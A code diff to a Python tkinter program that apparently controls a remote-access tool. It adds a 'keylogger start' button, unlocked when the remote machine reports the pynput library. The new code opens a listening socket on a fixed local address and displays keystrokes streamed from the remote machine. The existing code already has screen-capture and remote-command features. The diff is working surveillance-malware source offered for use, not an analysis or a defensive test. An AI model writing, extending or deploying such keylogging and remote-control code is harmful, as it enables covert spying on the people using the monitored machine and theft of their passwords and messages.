@@ -12,7 +12,9 @@ class remote_connection:
         self.socket_server.listen(1)
         connection, address = self.socket_server.accept()
         self.server = connection
-        self.pilactive = self.handshake(["connected"])[1]
+        self.vars = self.handshake(["connected"])
+        self.pilactive = self.vars[1]
+        self.pynputactive = self.vars[2]
         print(self.pilactive)
     def handshake(self,buffer):
         self.server.sendall(b"_")
@@ -54,6 +56,31 @@ class remote_connection:
         displaylabel = tkinter.Label(root,image=image)
         displaylabel.pack()
         root.mainloop()
+    def display_inputs(self):
+        root = tkinter.Tk()
+        text_box = tkinter.Text(root)
+        text_box.pack()
+        root.update()
+        temp_socket_server = socket.socket()
+        temp_socket_server.bind(("192.168.1.141",8019))
+        temp_socket_server.listen(1)
+        connection, address = temp_socket_server.accept()
+        temp_server = connection
+        while True:
+            key = temp_server.recv(1024).decode().strip("'")
+            if key != "_":
+                match key:
+                    case "Key.space":
+                        text_box.insert(tkinter.END," ")
+                    case "Key.enter":
+                        text_box.insert(tkinter.END,"\n")
+                    case "Key.backspace":
+                        text_box.delete("end-2c",tkinter.END)
+                    case _:
+                        text_box.insert(tkinter.END,key)
+            temp_server.sendall(b"_")
+            root.update()
+        
 class window(remote_connection):
     def __init__(self) -> None:
         super().__init__()
@@ -103,6 +130,15 @@ class window(remote_connection):
             self.screen_capture_button.grid(row=1,column=0,columnspan=1,sticky=tkinter.NSEW)
         else:
             print("pil not detected, some features may not work")
+        
+        if self.pynputactive == "True":
+            print("pynput detected, keylogger unlocked")
+            self.keylogger_button = tkinter.Button(self.quick_actions_frame,fg="green",bg="black",text="keylogger start",
+                                                command=lambda:self.quick_action(action="keylogger start"))
+            self.keylogger_button.grid(row=1,column=1,columnspan=1,sticky=tkinter.NSEW)
+        else:
+            print("pynput not detected, some functionality removed")
+        
         #upkeep of the program
         threading.Thread(target=self.mainloop).start()
         self.root.mainloop()
@@ -127,6 +163,9 @@ class window(remote_connection):
             case "screen capture":
                 self.outgoing_buffer.append("screen capture")
                 threading.Thread(target=self.file_transfer_socket).start()
+            case "keylogger start":
+                self.outgoing_buffer.append("keylogger start")
+                threading.Thread(target=self.display_inputs).start()
     def submit_command(self):
         command = self.submit_command_entry.get()
         if command == "":
